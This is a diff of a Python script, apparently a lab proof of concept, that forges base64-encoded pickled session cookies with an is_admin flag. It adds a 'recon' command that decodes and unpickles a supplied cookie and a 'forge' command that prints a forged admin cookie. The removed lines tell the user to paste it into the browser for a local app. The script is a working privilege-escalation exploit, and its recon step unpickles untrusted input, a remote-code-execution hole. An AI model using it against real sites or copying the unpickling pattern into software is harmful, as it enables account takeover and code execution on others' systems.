@@ -2,23 +2,60 @@ import base64
 import pickle
 import argparse
 
+
 def encode_session(obj: dict) -> str:
     raw = pickle.dumps(obj)
     return base64.urlsafe_b64encode(raw).decode("utf-8")
 
-def main():
-    parser = argparse.ArgumentParser(description="Lab PoC: forge insecure session cookie")
-    parser.add_argument("--user", default="alice", help="username to embed in cookie")
-    parser.add_argument("--admin", action="store_true", help="set is_admin=True")
-    args = parser.parse_args()
 
-    forged = {"user": args.user, "is_admin": bool(args.admin)}
+def decode_session(cookie_value: str):
+    raw = base64.urlsafe_b64decode(cookie_value)
+    return pickle.loads(raw)
+
+
+def recon(cookie_value: str):
+    obj = decode_session(cookie_value)
+
+    print("\nDecoded session object:")
+    print(obj)
+
+    print("\nDiscovered fields:")
+    for key, value in obj.items():
+        print(f"{key} = {value}")
+
+
+def forge(user: str, is_admin: bool):
+    forged = {
+        "user": user,
+        "is_admin": is_admin
+    }
+
     cookie_value = encode_session(forged)
 
-    print("FORGED session cookie value:\n")
     print(cookie_value)
-    print("\nUse it in your browser:")
-    print("DevTools → Application → Cookies → http://127.0.0.1:5000 → session → paste value")
+
+
+def main():
+    parser = argparse.ArgumentParser()
+    subparsers = parser.add_subparsers(dest="command", required=True)
+
+    # Recon command
+    recon_parser = subparsers.add_parser("recon")
+    recon_parser.add_argument("--cookie", required=True)
+
+    # Forge command
+    forge_parser = subparsers.add_parser("forge")
+    forge_parser.add_argument("--user", default="alice")
+    forge_parser.add_argument("--admin", action="store_true")
+
+    args = parser.parse_args()
+
+    if args.command == "recon":
+        recon(args.cookie)
+
+    elif args.command == "forge":
+        forge(args.user, args.admin)
+
 
 if __name__ == "__main__":
     main()
